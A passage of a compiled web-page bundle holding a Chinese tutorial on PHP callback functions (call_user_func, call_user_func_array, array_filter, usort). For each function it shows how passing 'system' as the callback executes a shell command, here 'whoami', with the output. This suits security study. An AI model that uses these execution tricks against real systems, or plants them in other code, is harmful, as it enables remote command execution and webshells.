punctuation"}),"."),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),":")," mixed"))),Object(p.b)("h4",{className:"__internal",id:"参数-3"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-3","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"第一个参数",Object(p.b)("inlineCode",{parentName:"p"},"callback"),"是被调用的回调函数，其余参数是回调函数的参数。"),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"callback：即将被调用的回调函数"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"parameter：传入回调函数的参数")),Object(p.b)("p",null,"这个函数还是非常好理解的，看一段简单的示例代码"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"callback"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$b"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"\\n"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$b"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"call_user_func"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'callback'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'我是参数1'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'我是参数2'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n\n\n执行结果——>\n我是参数1\n我是参数2"))),Object(p.b)("p",null,"可以看到此函数作用就是调用了笔者自定义的函数。那么这个如何实现代码执行呢？好说，你在前面自定义的函数中加入能执行命令的代码不久可以代码执行了。"),Object(p.b)("p",null,"示例代码："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"callback"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"return")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"system"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'whoami'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"call_user_func"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'callback'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n\n执行结果——>\ndesktop-m61j5j6\\admin"))),Object(p.b)("h3",{className:"__internal",id:"call_user_func_array"},"call_user_func_array()",Object(p.b)("a",c({parentName:"h3"},{href:"#call_user_func_array","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"这个函数名称跟上没什么大的差别，唯一的区别就在于参数的传递上，这个函数是把一个数组作为回调函数的参数"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"call_user_func_array"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"callable")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$callback"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$param_arr"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),":")," mixed"))),Object(p.b)("h4",{className:"__internal",id:"参数-4"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-4","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"callback：被调用的回调函数"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"param_arr：要被传入回调函数的数组，这个数组需要是索引数组")),Object(p.b)("p",null,"示例代码"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"callback"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$b"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"\\n"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$b"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$onearray")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'我是参数1'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'我是参数2'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"call_user_func_array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'callback'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$onearray"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n\n\n执行结果——>\n我是参数1\n我是参数2"))),Object(p.b)("p",null,"示例代码："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"callback"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"return")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"system"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'whoami'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"call_user_func_array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'callback'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n    \n执行结果——>\ndesktop-m61j5j6\\admin"))),Object(p.b)("h3",{className:"__internal",id:"array_filter"},"array_filter()",Object(p.b)("a",c({parentName:"h3"},{href:"#array_filter","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"用回调函数过滤数数组中的单元"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"array_filter"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$array"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"callable")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$callback"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," int ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$flag")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"0"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),":")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array")))),Object(p.b)("p",null,"依次将",Object(p.b)("inlineCode",{parentName:"p"},"array"),"数组中的每个值传到",Object(p.b)("inlineCode",{parentName:"p"},"callback"),"函数。如果",Object(p.b)("inlineCode",{parentName:"p"},"callback"),"函数返回",Object(p.b)("inlineCode",{parentName:"p"},"true"),"，则",Object(p.b)("inlineCode",{parentName:"p"},"array"),"数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。"),Object(p.b)("h4",{className:"__internal",id:"参数-5"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-5","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"array：要循环的数组"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"callback：使用的回调函数。如果没有提供",Object(p.b)("inlineCode",{parentName:"li"},"callback"),"函数，将删除",Object(p.b)("inlineCode",{parentName:"li"},"array"),"中所有等值为FALSE的条目。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"flag：决定",Object(p.b)("inlineCode",{parentName:"li"},"callback"),"接收的参数形式")),Object(p.b)("p",null,"代码示例（这里看官方的就行，很详细）："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"odd"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$var"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"// returns whether the input integer is odd"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"return"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$var")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"&")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"even"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$var"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token comment"}),"// returns whether the input integer is even"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"return"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"!"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$var")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"&")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n\n",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$array1")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"a"'),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"b"'),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"2"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"c"'),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"3"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"d"'),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"4"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"e"'),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),">"),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"5"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$array2")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"6"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"7"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"8"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"9"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"10"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"11"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"12"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Odd :\\n"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"print_r"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"array_filter"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$array1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"odd"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"echo")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"Even:\\n"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"print_r"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"array_filter"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$array2"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"even"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))," \n    \n    \n执行结果——>\nOdd :\nArray\n(\n    [a] => 1\n    [c] => 3\n    [e] => 5\n)\nEven:\nArray\n(\n    [0] => 6\n    [2] => 8\n    [4] => 10\n    [6] => 12\n)"))),Object(p.b)("p",null,"从上面代码我们知道，这个函数作用其实就是过滤，只不过这个过滤调用的是函数，而被过滤的是传入的参数。到这里你心里有没有代码执行的雏形了？"),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'whoami'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$array1"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$func")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'system'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"array_filter"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$array1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$func"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n    \n    \n执行结果——>\ndesktop-m61j5j6\\admin"))),Object(p.b)("h3",{className:"__internal",id:"usort"},"usort()",Object(p.b)("a",c({parentName:"h3"},{href:"#usort","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"使用用户自定义的比较函数对数组中的值进行排序"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"usort"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"&"),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$array"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"callable")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$value_compare_func"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),":")," bool"))),Object(p.b)("h4",{className:"__internal",id:"参数-6"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-6","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"array：输入的数组"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"cmp_function：在第一个参数小于、等于或大于第二个参数时，该比较函数必须相应地返回一个小于、等于或大于0的数")),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"func"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$b"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"return")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"<"),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$b"),Object(p.b)("span",c({parentName:"span"},{className:"token 